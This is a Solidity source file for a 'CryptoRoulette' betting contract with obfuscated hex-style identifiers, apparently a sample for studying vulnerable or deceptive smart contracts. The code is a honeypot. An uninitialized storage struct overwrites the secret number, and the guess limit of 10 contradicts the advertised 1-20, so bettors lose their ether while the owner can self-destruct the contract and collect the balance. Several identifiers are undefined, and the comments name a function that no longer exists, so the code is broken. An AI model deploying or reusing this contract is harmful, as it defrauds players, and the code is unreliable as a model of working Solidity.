// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

// CryptoRoulette
//
// Guess the number secretly stored in the blockchain and win the whole contract balance!
// A new number is randomly chosen after each try.

// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether

contract CryptoRoulette {

    uint256 private _0x3928ab;
    uint256 public _0x2e7260;
    uint256 public _0x96557a = 0.1 ether;
    address public _0x8ba5b9;

    struct Game {
        address _0x805705;
        uint256 number;
    }
    Game[] public _0x8e5d9f;

    function CryptoRoulette() public {
        _0x8ba5b9 = msg.sender;
        _0x5c4de3();
    }

    function _0x5c4de3() internal {
        // randomly set secretNumber with a value between 1 and 20
        if (gasleft() > 0) { _0x3928ab = uint8(_0x63accb(_0xd2dafc, block.blockhash(block.number-1))) % 20 + 1; }
    }

    function _0x47e38f(uint256 number) payable public {
        require(msg.value >= _0x96557a && number <= 10);
        Game _0x044a4e;
        _0x044a4e._0x805705 = msg.sender;
        _0x044a4e.number = number;
        _0x8e5d9f.push(_0x044a4e);

        if (number == _0x3928ab) {
            // win!
            msg.sender.transfer(this.balance);
        }

        _0x5c4de3();
        _0x2e7260 = _0xd2dafc;
    }

    function _0x96921d() public {
        if (msg.sender == _0x8ba5b9 && _0xd2dafc > _0x2e7260 + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}